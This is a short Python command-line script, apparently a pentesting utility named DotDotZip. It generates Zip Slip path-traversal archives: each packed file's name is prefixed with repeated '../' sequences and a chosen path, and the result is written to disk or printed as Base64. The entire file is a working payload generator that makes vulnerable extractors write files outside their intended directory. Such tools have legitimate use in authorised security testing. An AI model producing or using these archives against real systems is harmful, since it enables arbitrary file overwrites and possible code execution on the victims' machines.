import tomllib
import base64

from zipfile import ZipFile
from argparse import ArgumentParser
from io import BytesIO
from importlib import metadata

def version_from_pyproject_toml():
    try:
        with open("pyproject.toml", "rb") as f:
            pyproject_data = tomllib.load(f)
            return pyproject_data.get("project", {}).get("version", "Unknown")
    except FileNotFoundError:
        return "Unknown"

def version_redundant():
    try:
        return metadata.version(__package__)
    except metadata.PackageNotFoundError:
        return version_from_pyproject_toml()

def main():
    parser = ArgumentParser(description=f"DotDotZip v. {version_redundant()}")
    
    parser.add_argument("--traverse-count", type=int, default=5, help="Number of '../' sequences to prepend")
    parser.add_argument("--zip-name", type=str, help="Name of the output ZIP archive (leave blank to output Base64 encoded ZIP to the console)")
    parser.add_argument("--prepend-path", type=str, required=True, help="Extra path to prepend")
    parser.add_argument("--pack-files", type=str, nargs='+', required=True, help="Names of files to pack")
    
    args = parser.parse_args()
    
    traverse_str = '../'*args.traverse_count
    
    if not args.zip_name:
        with BytesIO() as zip_buffer:
            with ZipFile(zip_buffer, 'w') as zf:
                for file_name in args.pack_files:
                    try:
                        zf.write(file_name, arcname=f"{traverse_str}{args.prepend_path}/{file_name}")
                    except FileNotFoundError:
                        print(f"Error: The file '{file_name}' does not exist.")
            zip_buffer.seek(0)
            print(base64.b64encode(zip_buffer.read()).decode('utf-8'))
            
    else:
        with ZipFile(args.zip_name, 'w') as zf:
            for file_name in args.pack_files:
                try:
                    zf.write(file_name, arcname=f"{traverse_str}{args.prepend_path}/{file_name}")
                except FileNotFoundError:
                    print(f"Error: The file '{file_name}' does not exist.")

if __name__ == '__main__':
    main()